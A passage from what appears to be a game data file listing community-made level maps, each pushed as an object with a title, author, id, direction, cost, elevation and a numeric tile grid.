185,19,19,1,0,0,0,0,0,0,14,14,2,0,0,0,19,14,185,185,185,185,185,14,14,14,0,0,0,14,14,14,2,0,0,0,0,19,185,185,185,185,185,14,14,14,14,0,0,14,14,14,14,0,0,0,0,0,19,19,185,185,185,14,14,14,14,0,14,14,14,14,1,0,0,0,0,0,0,0,19,19,19,1,14,14,14,1,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Hope You Can E Pick",author="ZpLit",id="#1669444825",direction="forward",cost=354,elevation=0,map=[0,0,0,0,0,0,0,20,54,2,2,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,67,67,67,0,0,20,20,54,54,20,20,0,0,77,77,77,0,0,0,13,66,66,66,13,0,0,14,14,90,14,0,0,13,76,76,76,13,0,0,13,13,66,66,13,0,0,14,14,14,14,0,0,13,76,76,13,13,0,0,145,18,93,66,13,0,0,90,14,14,14,0,0,13,76,94,18,3,0,0,13,13,66,66,13,0,0,14,14,14,90,0,0,13,76,76,13,13,0,0,13,13,66,66,13,0,0,14,14,14,14,0,0,13,76,76,13,13,0,0,145,18,93,66,13,0,0,14,90,14,14,0,0,13,76,94,18,3,0,0,13,13,66,66,13,0,0,14,14,14,14,0,0,13,76,76,13,13,0,0,13,13,66,66,13,0,0,14,14,14,14,0,0,13,76,76,13,13,0,0,145,18,93,66,13,0,0,14,14,90,14,0,0,13,76,94,18,3,0,0,13,13,66,66,13,0,0,90,14,14,14,0,0,13,76,76,13,13,0,0,13,13,66,66,13,0,0,14,14,14,90,0,0,13,76,76,13,13,0,0,145,18,93,66,13,0,0,14,14,14,14,0,0,13,76,94,18,3,0,0,13,13,66,66,13,0,0,14,90,14,14,0,0,13,76,76,13,13,0,0,13,66,66,66,13,0,0,14,14,14,14,0,0,13,76,76,76,13,0,0,0,67,67,67,0,0,20,20,54,54,20,20,0,0,77,77,77,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,88,2,2,88,20,0,0,0,0,0,0,0]});
maps.push({name="Checkout Regret",author="ZpLit",id="#1669446168",direction="forward",cost=227,elevation=0,map=[0,0,0,0,0,5,5,5,5,5,2,2,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,1,5,5,89,5,90,1,5,5,0,0,0,0,0,0,0,0,0,5,89,1,5,5,5,5,5,1,89,5,0,0,0,0,0,0,0,0,0,5,5,1,5,5,5,5,5,1,5,5,0,0,0,0,0,0,0,0,0,5,5,1,5,90,5,5,5,1,5,5,0,0,0,0,0,0,0,0,0,5,5,1,5,5,5,5,5,1,5,5,0,0,0,0,0,0,0,0,0,5,5,1,5,5,5,5,5,1,5,5,0,0,0,0,0,0,0,0,0,5,5,1,5,94,24,94,5,1,5,5,0,0,0,0,0,0,0,0,0,89,5,1,91,24,93,24,91,1,5,89,0,0,0,0,0,0,0,0,0,5,5,1,5,94,24,94,5,1,5,5,0,0,0,0,0,0,0,0,0,6,6,1,89,5,100,5,89,1,6,6,0,0,0,0,0,0,0,0,0,7,7,1,90,5,5,5,5,1,7,7,0,0,0,0,0,0,0,0,0,8,8,1,5,5,5,5,5,1,8,8,0,0,0,0,0,0,0,0,0,9,9,1,5,5,5,5,90,1,9,9,0,0,0,0,0,0,0,0,0,10,10,1,5,5,5,5,5,1,10,10,0,0,0,0,0,0,0,0,0,11,11,1,5,5,5,5,5,1,11,11,0,0,0,0,0,0,0,0,0,12,12,1,5,5,5,5,5,1,12,12,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,88,2,2,88,5,5,5,5,0,0,0,0]});
maps.push({name="Stay Up Top",author="ZpLit",id="#1669449920",direction="forward",cost=52,elevation=-19,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,131,131,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,132,132,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Island Hopping",author="sivi",id="#1669488343",direction="forward",cost=405,elevation=17,map=[0,0,5,5,2,2,5,0,0,0,0,0,0,13,15,15,0,0,0,0,0,5,5,90,5,5,9998,6,0,0,0,9,13,13,93,13,9,12,13,0,6,9998,65,5,5,9998,6,8,0,0,9,9,9,13,13,13,9,9,9,13,9998,65,65,65,5,5,9998,8,0,0,9,132,9,9,9,9,9,133,9,9,5,65,65,65,5,131,5,0,0,0,9,9,9,9,9998,9,9,9,9,9998,5,65,65,90,5,5,9998,6,0,0,0,12,13,9998,10,9998,9998,9,9998,10,90,65,65,5,5,5,5,9998,0,0,0,0,0,13,0,0,10,12,12,0,5,65,65,65,65,65,90,0,0,24,23,90,0,0,0,0,0,0,0,0,9998,65,65,158,65,5,5,0,24,22,9998,22,22,67,67,22,90,22,88,0,6,9998,65,65,65,9998,189,0,24,22,137,22,65,65,65,65,65,22,22,90,0,5,90,5,9998,6,5,0,23,90,22,22,65,65,65,65,22,22,22,22,0,0,0,0,0,0,0,0,0,22,22,22,90,65,22,22,22,22,90,22,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,0,43,43,0,0,0,18,90,14,0,77,77,77,14,90,14,20,0,0,0,0,44,44,0,0,20,14,14,14,14,75,75,75,14,14,14,14,18,0,0,0,44,44,0,0,18,14,134,14,14,75,14,75,75,14,14,90,20,0,0,0,44,44,0,0,21,14,14,14,75,75,75,75,75,14,14,14,20,0,0,0,43,43,0,0,0,20,90,14,75,75,75,75,14,14,136,14,18,0,0,22,22,22,22,22,0,0,18,94,24,77,77,77,24,90,14,9998,21,0,22,22,22,22,22,90,0,0,0,9998,24,75,75,75,24,24,20,9998,19,0,22,90,2,2,22,88]});
maps.push({name="Chess Or Checkers",author="ZpLit",id="#1669497806",direction="right",cost=656,elevation=0,map=[2,2,24,24,91,91,91,91,24,24,24,24,89,89,89,89,94,94,94,94,24,24,24,24,91,91,91,91,24,24,24,24,89,89,89,89,94,94,94,94,24,24,24,24,91,91,91,91,24,24,24,24,89,89,89,89,94,94,94,94,24,24,24,24,91,91,91,91,24,24,24,24,89,89,89,89,94,94,94,94,91,91,91,91,24,24,24,24,144,144,144,144,24,24,24,24,89,89,89,89,91,91,91,91,24,24,24,24,144,144,144,144,24,24,24,24,89,89,89,89,91,91,91,91,24,24,24,24,144,144,144,144,24,24,24,24,89,89,89,89,91,91,91,91,24,24,24,24,144,144,144,144,24,24,24,24,89,89,89,89,24,24,24,24,144,144,144,144,24,24,24,24,144,144,144,144,24,24,24,24,24,24,24,24,144,144,144,144,24,24,24,24,144,144,144,144,24,24,24,24,24,24,24,24,144,144,144,144,24,24,24,24,144,144,144,144,24,24,24,24,24,24,24,24,144,144,144,144,24,24,24,24,144,144,144,144,24,24,24,24,89,89,89,89,24,24,24,24,144,144,144,144,24,24,24,24,91,91,91,91,89,89,89,89,24,24,24,24,144,144,144,144,24,24,24,24,91,91,91,91,89,89,89,89,24,24,24,24,144,144,144,144,24,24,24,24,91,91,91,91,89,89,89,89,24,24,24,24,144,144,144,144,24,24,24,24,91,91,91,91,93,93,93,93,89,89,89,89,24,24,24,24,91,91,91,91,24,24,24,24,93,93,93,93,89,89,89,89,24,24,24,24,91,91,91,91,24,24,24,2,93,93,93,93,89,89,89,89,24,24,24,24,91,91,91,91,24,24,24,2,93,93,93,93,89,89,89,89,24,24,24,24,91,91,91,91,24,24,24,24]});
maps.push({name="Shortcut",author="tilgep",id="#1669500561",direction="right",cost=152,elevation=-11,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,65,12,12,12,0,0,22,22,22,22,22,22,22,22,23,23,1,0,0,0,65,12,12,12,0,0,22,22,22,22,22,22,22,22,23,23,0,0,0,0,65,12,12,12,0,0,21,21,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,0,0,21,21,0,0,0,1,1,1,1,0,0,0,0,0,0,12,12,12,0,0,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,21,21,0,0,1,0,19,19,0,0,0,0,0,0,0,12,12,12,0,0,21,21,0,0,1,100,19,19,0,0,0,0,0,0,0,12,12,12,2,0,21,21,0,0,1,0,19,19,0,0,0,0,0,0,0,12,12,12,2,0,21,21,0,0,0,0,19,19,0,0,1,0,0,0,0,0,0,0,0,0,21,21,0,0,0,0,19,19,0,0,0,0,1,0,0,0,0,0,0,0,21,21,0,0,0,0,19,19,0,0,0,0,0,0,0,16,16,0,0,0,21,21,0,0,0,0,19,19,18,18,17,17,17,16,16,16,16,0,0,0,21,21,0,0,0,0,19,19,18,18,17,17,17,16,16,16,16,0,0,0,21,21,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,21,21,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Leg Day",author="ZpLit",id="#1669503594",direction="forward",cost=171,elevation=0,map=[0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,1,141,141,141,141,141,141,1,0,0,0,0,0,0,0,0,0,0,0,0,44,44,44,44,44,44,44,100,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,65,65,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,1,141,141,141,141,141,141,1,0,0,0,0,0,0,0,0,0,0,0,0,100,44,44,44,44,44,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,65,65,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,1,141,141,141,141,141,141,1,0,0,0,0,0,0,0,0,0,0,0,0,64,64,64,64,64,64,64,100,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,65,65,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,88,2,2,88,5,0,0,0,0,0,0,0]});
maps.push({name="Average ZpLit Map",author="ZpLit",id="#1669509775",direction="forward",cost=314,elevation=-14,map=[0,0,0,94,24,24,24,24,24,2,2,24,24,24,24,24,94,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,24,24,127,24,94,24,24,24,24,94,24,127,24,24,0,0,0,0,0,0,24,24,24,24,1,23,23,23,23,1,24,24,24,24,0,0,0,0,0,0,24,24,24,90,1,22,22,22,22,1,90,24,24,24,0,0,0,0,0,0,24,86,24,24,1,21,21,21,21,1,24,24,86,24,0,0,0,0,0,0,90,24,24,24,1,20,20,20,20,1,24,24,24,90,0,0,0,0,0,0,24,24,86,24,1,19,19,19,19,1,24,86,24,24,0,0,0,199,0,0,24,24,90,24,1,18,18,18,18,1,24,90,24,24,0,0,0,93,199,0,24,127,24,24,1,17,17,17,17,1,24,24,127,24,0,0,0,93,199,0,24,24,24,86,1,16,16,16,16,1,86,24,24,24,0,0,0,199,0,0,24,90,24,24,1,15,15,15,15,1,24,24,90,24,0,0,0,0,0,0,24,24,24,24,1,14,14,14,14,1,24,24,24,24,0,0,0,0,0,0,24,24,90,24,1,13,13,13,13,1,24,90,24,24,0,0,0,0,0,0,24,24,24,24,1,12,12,12,12,1,24,24,24,24,0,0,0,0,0,0,24,86,24,24,1,11,11,11,11,1,24,24,86,24,0,0,0,0,0,0,24,24,24,90,1,10,10,10,10,1,90,24,24,24,0,0,0,0,0,0,24,24,24,24,24,88,10,10,88,24,24,24,24,24,0,0,0,0,0,0,24,24,24,87,24,10,10,10,10,24,87,24,24,24,0,0,0,0,0,0,24,24,24,24,24,127,2,2,127,24,24,24,24,24,0,0,0]});
maps.push({name="Leap of Faith",author="sivi",id="#1669514881",direction="left",cost=436,elevation=1,map=[24,22,20,20,0,0,0,0,0,0,0,0,0,1,1,2,2,105,1,1,90,6,6,24,22,20,0,0,0,0,0,0,0,1,1,105,105,105,1,1,2,6,6,90,88,18,22,0,0,0,0,0,0,1,1,5,5,5,1,1,2,6,6,6,6,6,20,0,0,0,0,0,0,1,1,185,185,185,1,1,6,6,6,6,6,90,6,24,0,0,0,0,0,1,150,185,185,185,150,1,16,6,6,6,6,6,6,6,22,0,0,0,0,1,1,185,185,185,1,1,18,14,90,5,5,5,5,5,20,24,0,0,0,1,1,185,185,185,1,1,20,16,12,5,65,65,65,5,90,22,0,0,0,1,150,185,185,185,150,1,22,19,15,5,65,65,65,65,5,0,0,0,0,1,1,185,185,185,1,1,18,15,13,90,65,65,65,65,67,0,0,0,0,1,1,185,185,185,1,1,20,18,16,5,65,65,65,65,67,0,0,0,0,93,1,124,124,124,1,0,22,20,94,5,65,65,65,65,67,0,0,0,183,124,199,124,124,124,199,0,24,18,90,5,65,65,65,65,5,0,0,0,183,199,124,124,124,124,199,0,22,20,5,65,65,65,65,65,90,5,0,183,183,199,124,124,124,124,199,0,24,24,65,65,65,65,65,65,65,5,0,183,199,124,124,124,124,124,199,0,65,67,65,65,65,65,65,65,65,5,0,1,124,124,124,124,124,1,0,0,65,67,65,65,65,65,65,65,65,5,0,124,124,124,124,124,124,199,0,0,65,67,65,65,65,65,65,65,65,5,0,124,124,124,124,124,199,0,0,0,24,22,5,5,5,65,65,65,5,90,0,1,199,199,199,1,0,0,0,0,24,24,22,20,5,90,5,5,5,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Death by 1 000 Cuts",author="ZpLit",id="#1669523652",direction="left",cost=279,elevation=11,map=[0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,2,2,0,1,5,35,35,5,33,33,5,31,31,5,29,29,5,27,27,5,5,5,0,1,5,35,35,5,33,33,5,31,31,5,29,29,5,27,27,5,5,5,0,1,5,5,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,1,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,5,27,27,1,1,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,5,27,27,1,1,5,5,0,0,0,0,0,0,187,9,96,96,96,0,0,5,5,5,1,1,39,39,5,41,41,5,43,42,42,42,9,131,96,0,0,5,29,29,1,1,39,39,5,41,41,5,43,42,87,42,42,9,96,0,0,5,29,29,1,0,0,0,0,0,0,0,0,199,42,100,42,42,9,0,0,5,5,5,1,0,0,0,0,0,0,0,199,41,42,42,87,42,188,0,0,0,31,31,1,0,0,0,0,0,0,199,40,41,41,199,42,42,0,0,0,0,31,31,1,0,0,0,0,0,199,39,40,40,199,0,43,43,0,0,0,0,5,5,1,0,0,0,0,199,38,39,39,199,0,0,5,5,0,0,0,0,33,33,1,1,0,0,199,37,38,38,199,0,0,0,41,41,0,0,0,0,33,33,1,93,1,1,36,37,37,199,0,0,0,0,41,41,0,0,0,0,5,5,1,36,36,36,132,36,199,0,0,0,0,0,5,5,0,0,0,0,35,35,1,2,36,36,36,1,0,0,0,0,0,0,39,39,5,37,37,5,35,35,1,2,36,36,36,1,0,0,0,0,0,0,39,39,5,37,37,5,5,5,1,36,36,36,36,93,1,0,0,0,0,0,1,1,1,1,1,1,1,1,0]});
maps.push({name="It Is Batchest Time",author="ZpLit",id="#1669527062",direction="left",cost=237,elevation=0,map=[88,14,14,14,14,14,14,14,14,14,14,14,1,1,1,14,2,2,14,0,2,14,14,14,14,14,14,14,14,14,14,14,14,14,1,14,90,14,14,0,2,14,14,14,14,14,14,14,14,14,14,14,14,14,1,14,14,14,14,0,88,14,14,14,14,14,14,14,14,14,14,14,14,14,1,14,14,90,14,0,0,0,0,0,0,16,0,0,0,0,0,0,14,14,96,90,14,14,14,0,0,1,142,142,1,16,0,0,0,0,0,0,14,96,14,14,14,14,90,0,0,0,0,0,0,0,16,0,0,0,0,0,96,14,90,14,14,14,14,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,151,0,151,0,0,1,183,183,1,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,1,36,36,1,0,0,0,0,16,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,16,0,0,0,0,1,142,142,142,1,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,1,142,142,142,1,0,1,142,142,1,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,92,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,1,1,0,0,1,1,0,0,14,14,14,14,0,0,14,14,93,14,0,0,142,142,0,0,183,36,0,92,14,94,14,14,0,0,14,97,14,14,0,0,142,142,0,0,183,36,0,92,14,14,94,14,0,0,87,14,14,14,0,0,1,1,0,0,1,1,0,0,14,14,14,87,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Godlike E Picker",author="ZpLit",id="#1669528267",direction="forward",cost=272,elevation=0,map=[0,0,0,0,0,0,0,1,14,2,2,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,187,16,0,0,0,0,0,1,14,14,14,14,1,1,1,0,0,0,0,0,0,93,9998,10,3,14,14,195,14,14,14,14,91,14,14,1,0,0,0,0,0,0,0,0,0,14,14,195,14,14,14,14,91,14,14,1,0,0,0,0,0,0,189,189,0,14,97,1,14,14,14,14,1,91,91,1,0,0,0,0,187,13,7,7,0,14,14,1,14,14,14,14,1,14,14,1,0,0,0,0,0,100,65,65,3,14,14,1,14,14,14,14,1,91,91,1,0,0,0,0,0,0,1,1,1,14,14,1,14,14,14,14,1,14,14,1,0,0,0,0,187,18,99,9998,12,14,14,1,14,14,14,14,1,94,94,1,0,0,0,0,187,18,99,9998,12,14,14,1,14,14,14,14,1,94,94,1,0,0,0,0,0,0,1,1,1,14,14,1,14,14,14,14,1,14,14,1,0,0,0,0,0,100,65,65,3,14,14,1,14,14,14,14,1,91,91,1,0,0,0,0,187,13,7,7,0,14,14,1,14,14,14,14,1,14,14,1,0,0,0,0,0,0,188,188,0,14,14,1,14,14,97,14,1,91,91,1,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,196,14,14,1,0,0,0,0,0,93,9998,10,3,14,14,14,14,14,14,14,196,14,14,1,0,0,0,0,187,16,0,0,0,0,0,1,96,96,96,96,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,88,2,2,88,1,0,0,0,0,0,0,0]});
maps.push({name="doorhuggers pls trig",author="alli",id="#1669531173",direction="forward",cost=247,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,2,2,14,14,1,0,19,19,19,0,0,0,0,0,0,0,14,90,94,14,14,14,14,90,1,0,19,97,131,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,19,19,19,0,0,0,0,0,0,0,15,15,15,15,14,14,14,14,1,0,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,1,1,143,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,1,0,0,0,0,0,0,0,0,27,27,27,27,27,27,0,0,0,36,36,1,0,0,0,0,0,0,0,0,27,27,27,27,27,27,0,0,0,36,36,24,126,34,33,32,31,30,29,28,27,27,27,0,0,0,0,0,0,36,36,0,34,34,33,32,31,30,29,28,27,27,27,0,0,0,0,0,0,15,15,24,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,24,14,14,132,1,96,96,1,1,24,93,24,20,20,20,20,0,1,14,90,0,96,96,1,1,38,38,0,0,3,93,24,66,67,20,0,1,1,0,0,0,96,14,24,0,34,34,1,1,24,24,24,20,0,100,1,1,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,9998,14,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0]});
maps.push({name="ancient gorge",author="alli",id="#1669531558",direction="forward",cost=258,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,19,19,19,1,0,0,0,0,0,0,0,0,0,0,0,7,94,7,19,19,19,19,1,0,0,0,0,0,0,7,7,7,7,7,7,19,19,19,19,19,19,23,1,0,0,0,0,0,7,19,19,19,19,19,19,19,22,23,24,1,24,1,0,0,0,0,0,7,19,19,23,1,23,24,1,24,1,1,1,0,1,0,0,0,0,0,1,7,119,1,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,1,7,19,19,23,1,24,24,1,24,1,0,1,1,0,0,0,0,0,1,23,0,7,19,19,19,19,19,19,19,23,1,24,23,1,0,0,0,0,1,24,23,0,7,7,7,7,7,7,19,19,19,19,19,22,1,0,0,1,24,65,67,74,21,186,0,0,0,0,7,7,7,7,19,19,23,1,0,1,24,65,67,74,21,186,0,0,0,0,0,0,0,0,7,19,24,1,0,1,24,65,67,74,21,186,0,0,0,0,0,0,0,0,0,185,7,24,1,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,39,7,1,0,1,24,65,67,74,21,186,0,0,0,0,0,0,0,0,0,39,7,22,1,1,24,65,67,74,21,186,0,0,0,0,0,0,0,0,7,185,7,24,1,1,24,65,67,74,21,186,189,0,0,0,3,7,94,7,19,19,23,1,0,0,1,24,23,0,0,93,24,0,0,19,19,19,19,19,19,22,1,0,0,0,0,1,1,141,93,93,24,0,19,19,19,24,1,23,24,1,0,0,0,0,0,0,0,1,1,1,1,0,2,2,19,1,0,1,1,0,0,0,0]});
maps.push({name="overthinking",author="alli",id="#1669531736",direction="forward",cost=373,elevation=6,map=[0,0,0,0,0,0,0,0,0,0,1,1,1,1,13,2,2,13,1,0,0,0,0,0,0,0,0,0,0,1,100,24,5,94,13,13,13,13,94,1,0,0,0,0,0,0,0,0,0,1,3,24,5,5,19,54,54,19,5,1,0,0,0,0,0,0,0,0,1,19,19,19,65,5,5,185,185,5,5,1,0,0,0,0,0,0,0,0,1,162,91,162,67,65,5,185,185,5,5,1,0,0,0,0,0,0,0,0,1,162,162,162,67,65,5,185,185,65,5,1,0,0,0,0,0,0,0,0,1,91,162,162,67,65,5,185,185,5,5,1,0,0,0,0,0,0,0,0,1,162,91,162,67,65,5,185,185,5,5,1,0,0,0,0,0,0,0,0,1,162,162,162,67,65,5,185,185,5,5,1,0,0,0,0,0,0,0,0,1,91,162,162,67,65,19,54,54,19,5,1,0,0,0,0,0,0,0,0,1,162,91,162,67,65,5,185,185,5,5,1,0,0,0,0,0,0,0,0,1,91,162,162,67,65,65,185,185,5,5,1,0,0,0,0,0,0,0,0,1,162,91,162,67,65,5,185,185,5,5,1,0,0,0,0,0,0,0,0,1,91,162,162,67,65,5,185,185,65,5,1,0,0,0,0,0,0,0,0,1,162,91,162,67,65,5,185,185,5,5,1,0,0,0,0,0,0,0,1,24,162,162,162,67,65,5,185,185,5,5,1,0,0,0,0,0,0,1,93,24,19,19,9998,3,5,19,54,54,19,5,1,0,0,0,0,0,0,1,93,24,19,19,19,13,13,13,13,13,13,5,1,0,0,0,0,0,0,1,93,24,19,19,19,18,17,16,15,14,13,141,1,0,0,0,0,0,0,0,1,1,2,2,1,1,1,1,1,1,1,1,0]});
maps.push({name="sivis kz dojo",author="alli",id="#1669532190",direction="right",cost=196,elevation=1,map=[0,0,13,2,2,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,90,114,114,114,114,114,90,88,90,114,114,114,114,114,88,1,0,0,0,1,94,114,114,114,114,114,114,114,114,114,114,114,114,114,114,95,14,2,0,1,94,114,114,114,114,114,114,114,114,114,114,114,114,114,114,95,14,2,0,1,90,114,114,114,114,114,114,114,114,114,14,14,14,114,88,1,0,0,0,1,114,114,114,114,1,199,199,199,199,1,18,18,18,1,1,0,0,0,0,0,1,114,114,1,0,0,0,0,0,1,93,93,93,0,0,0,0,0,0,0,24,14,14,24,0,0,0,0,0,199,0,3,0,0,0,0,0,0,0,0,22,14,14,22,0,0,0,0,0,199,0,17,0,0,0,0,0,0,0,0,0,14,3,173,0,0,0,0,0,199,0,188,0,0,0,0,0,0,0,0,0,145,22,170,17,37,37,17,0,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,151,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,117,199,142,199,117,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,188,199,3,18,186,42,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,117,199,199,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,145,17,117,186,0,188,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Art Heist",author="sivi",id="#1669565360",direction="forward",cost=222,elevation=0,map=[1,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,114,114,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,90,114,114,90,115,115,115,115,90,1,0,0,0,0,0,0,0,0,0,1,9998,114,114,114,115,115,199,115,115,1,0,0,0,0,0,0,0,0,0,1,115,9998,114,114,115,199,93,199,115,1,0,0,0,0,0,0,0,0,0,1,115,9998,114,114,115,115,199,115,115,1,0,0,0,0,0,0,0,0,0,1,9998,114,114,114,115,115,115,115,90,1,0,0,0,0,0,0,0,0,0,1,90,114,114,114,115,115,199,115,115,1,0,0,0,0,0,0,0,0,0,1,88,114,114,114,115,199,93,199,115,1,0,0,0,0,0,0,0,0,0,1,90,114,114,114,115,115,199,115,115,1,0,0,0,0,0,0,0,0,0,1,9998,114,114,114,115,115,115,115,90,1,0,0,0,0,0,0,0,0,0,1,115,9998,114,114,115,115,199,115,115,1,0,0,0,0,0,0,0,0,0,1,115,9998,114,114,115,199,93,199,115,1,0,0,0,0,0,0,0,0,0,1,9998,114,114,114,115,115,199,115,115,1,0,0,0,0,0,0,0,0,0,1,90,114,114,90,115,115,115,115,90,1,0,0,0,0,0,0,0,0,0,1,1,95,95,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,114,114,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
